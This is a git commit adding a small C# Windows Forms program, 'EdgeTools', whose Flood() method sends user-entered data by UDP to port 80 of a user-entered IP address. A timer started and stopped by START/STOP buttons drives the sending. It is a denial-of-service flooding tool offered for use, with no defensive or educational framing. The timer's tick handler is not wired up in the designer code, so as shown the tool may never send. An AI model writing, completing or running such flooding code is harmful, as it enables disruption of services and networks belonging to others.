5cdc10da40f3e684022f33cc04f1a985e3dbbe63
Edge <88197449+EdgeNC@users.noreply.github.com>
2021-10-09 15:13:58 +0700

    Add files via upload

---
+++ project edge/project edge/Form1.Designer.cs
@@ -0,0 +1,152 @@
+﻿
+namespace project_edge
+{
+    partial class Form1
+    {
+        /// <summary>
+        ///  Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///  Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        ///  Required method for Designer support - do not modify
+        ///  the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.label3 = new System.Windows.Forms.Label();
+            this.ipTxt = new System.Windows.Forms.TextBox();
+            this.dataTxt = new System.Windows.Forms.TextBox();
+            this.floodTimer = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Showcard Gothic", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label1.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.label1.Location = new System.Drawing.Point(205, 20);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(90, 15);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "EdgeProject";
+            this.label1.Click += new System.EventHandler(this.label1_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Showcard Gothic", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label2.Location = new System.Drawing.Point(61, 52);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(78, 15);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "IP Address";
+            this.label2.Click += new System.EventHandler(this.label2_Click);
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.SystemColors.MenuHighlight;
+            this.button1.Font = new System.Drawing.Font("Showcard Gothic", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.button1.Location = new System.Drawing.Point(145, 126);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(93, 25);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "START";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.BackColor = System.Drawing.SystemColors.MenuHighlight;
+            this.button2.Font = new System.Drawing.Font("Showcard Gothic", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.button2.Location = new System.Drawing.Point(278, 126);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(93, 25);
+            this.button2.TabIndex = 3;
+            this.button2.Text = "STOP";
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Showcard Gothic", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label3.Location = new System.Drawing.Point(101, 94);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(38, 15);
+            this.label3.TabIndex = 4;
+            this.label3.Text = "DATA";
+            this.label3.UseWaitCursor = true;
+            this.label3.Click += new System.EventHandler(this.label3_Click);
+            // 
+            // ipTxt
+            // 
+            this.ipTxt.Location = new System.Drawing.Point(145, 50);
+            this.ipTxt.Multiline = true;
+            this.ipTxt.Name = "ipTxt";
+            this.ipTxt.Size = new System.Drawing.Size(226, 17);
+            this.ipTxt.TabIndex = 5;
+            // 
+            // dataTxt
+            // 
+            this.dataTxt.Location = new System.Drawing.Point(145, 92);
+            this.dataTxt.Multiline = true;
+            this.dataTxt.Name = "dataTxt";
+            this.dataTxt.Size = new System.Drawing.Size(226, 17);
+            this.dataTxt.TabIndex = 6;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.SystemColors.ButtonHighlight;
+            this.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("$this.BackgroundImage")));
+            this.ClientSize = new System.Drawing.Size(425, 200);
+            this.Controls.Add(this.dataTxt);
+            this.Controls.Add(this.ipTxt);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Name = "Form1";
+            this.Text = "EdgeTools";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox ipTxt;
+        private System.Windows.Forms.TextBox dataTxt;
+        private System.Windows.Forms.Timer floodTimer;
+    }
+}
+
---
+++ project edge/project edge/Form1.cs
@@ -0,0 +1,74 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net;
+using System.Net.Sockets;
+
+namespace project_edge
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label2_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label3_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            floodTimer.Start();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            floodTimer.Stop();
+        }
+        private void floodTimer_Tick(object sender, EventArgs e)
+        {
+            Flood();
+        }
+        public void Flood()
+        {
+            UdpClient client = new UdpClient();
+
+            IPAddress ipAddr = IPAddress.Parse(ipTxt.Text);
+
+            try
+            {
+                client.Connect(ipAddr, 80);
+                byte[] sendByte = Encoding.ASCII.GetBytes(dataTxt.Text);
+                client.Send(sendByte, sendByte.Length);
+                client.AllowNatTraversal(true);
+                client.DontFragment = true;
+            }
+            catch
+            {
+                const string errorMessage = "Something went wrong";
+                const string errorCaption = "Please ensure you entered everything correctly";
+
+                MessageBox.Show(errorMessage, errorCaption,
+                    MessageBoxButtons.OK);
+            }
+        }
+    }
+}
